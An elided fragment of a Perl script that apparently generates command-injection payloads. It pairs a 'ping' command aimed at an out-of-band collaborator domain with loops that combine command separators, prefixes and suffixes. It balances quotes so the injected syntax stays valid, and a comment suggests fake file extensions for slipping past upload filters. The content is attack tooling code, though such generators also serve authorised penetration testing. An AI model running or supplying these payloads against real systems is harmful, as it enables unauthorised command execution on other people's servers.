...
my $COMMAND='ping';
my $ARGUMENT='xPAYLOAD_MARK.lookup.evilcollab.domain';
...
my @SUFFIXES=('invvvvv212.org','1','foo'); # example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
my @PREFIXES=('invvvvv212.org','1','foo');
...
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		foreach my $prefix(@PREFIXES)
		{
			...
			$curr_payload.="'"	if($curr_payload=~/'/); 
			$curr_payload.='"'	if($curr_payload=~/"/); # if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
		}
	}
}
...
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		foreach my $suffix(@SUFFIXES)
		{
			foreach my $prefix(@PREFIXES)
			{
				my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator.$suffix;
				$curr_payload.="'"	if($curr_payload=~/'/); 
				$curr_payload.='"'	if($curr_payload=~/"/); # if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
				push(@output_payloads,$curr_payload);
			}
